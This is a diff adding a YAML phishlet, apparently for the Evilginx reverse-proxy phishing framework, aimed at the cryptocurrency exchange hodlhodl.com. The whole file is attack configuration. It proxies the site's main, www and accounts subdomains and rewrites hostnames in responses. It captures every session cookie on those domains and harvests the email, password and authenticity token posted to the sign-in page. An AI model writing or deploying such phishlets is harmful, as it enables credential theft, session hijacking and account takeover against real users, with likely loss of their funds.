@@ -1,0 +1,45 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'hodlhodl.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'hodlhodl.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'hodlhodl.com', session: true, is_landing: false, auto_filter: false}
+  
+sub_filters:
+  - {triggers_on: '', orig_sub: '', domain: 'hodlhodl.com', search: 'https://{hostname}', replace: 'https://{hostname_regexp}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript','application/signed-exchange']}
+  - {triggers_on: 'www.hodlhodl.com', orig_sub: 'www', domain: 'hodlhodl.com', search: 'https://{hostname}', replace: 'https://{hostname_regexp}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'accounts.hodlhodl.com', orig_sub: 'accounts', domain: 'hodlhodl.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+ 
+
+auth_tokens:
+  - domain: '.hodlhodl.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.accounts.hodlhodl.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+
+auth_urls:
+  - '/'
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'authenticity_toke'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'accounts.hodlhodl.com'
+  path: '/accounts/sign_in'
+
